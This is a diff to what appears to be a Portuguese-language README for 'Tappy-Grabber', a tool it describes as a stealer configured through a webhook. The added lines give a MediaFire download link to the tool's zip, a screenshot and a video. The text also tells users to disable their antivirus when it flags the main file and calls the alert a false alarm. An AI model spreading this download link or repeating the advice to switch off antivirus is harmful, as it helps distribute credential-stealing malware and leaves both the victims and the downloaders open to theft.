@@ -8,4 +8,22 @@
 * 2- Caso apite seu anti virus com o ARQUIVO PRINCIPAL desative-o pois o arquivo esta limpo e isso pode ser um falso alarme, aqui você pode ver o resultado do virus total se estiver desconfiado ou pode jogar o arquivo la.
 * 3- Uma webhook para criar seu stealer.
 
+
 ![download](https://user-images.githubusercontent.com/113463089/189969167-48c22b23-5506-42d0-bef5-a8d61be625d3.png)
+
+<br>
+💸 <b>• DOWNLOAD :</b> https://www.mediafire.com/file/hwzxxam76olqurn/Tappy-Grabber.zip/file
+
+
+<br>
+<br>
+<br>
+
+
+
+https://user-images.githubusercontent.com/113463089/189970949-66be5293-dc55-4d4d-9a45-e4795020d0a3.mp4
+
+
+
+
+
